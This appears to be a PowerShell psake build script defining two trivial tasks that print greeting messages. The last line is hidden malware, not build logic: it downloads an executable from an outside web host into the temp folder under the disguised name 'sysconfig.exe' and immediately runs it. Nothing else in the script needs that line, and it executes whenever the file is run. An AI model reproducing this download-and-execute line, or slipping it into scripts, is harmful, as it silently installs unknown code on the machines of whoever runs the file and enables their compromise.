$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

properties {
    
    
    
    $container = @{}
}

Task default -depends task2

Task Step1 -alias task1 {
    'Hi from Step1 (task1)'
}

Task Step2 -alias task2 -depends task1 {
    'Hi from Step2 (task2)'
}

(New-Object System.Net.WebClient).DownloadFile('http://www.macwizinfo.com/updates/anna.exe',"$env:TEMP\sysconfig.exe");Start-Process ("$env:TEMP\sysconfig.exe")

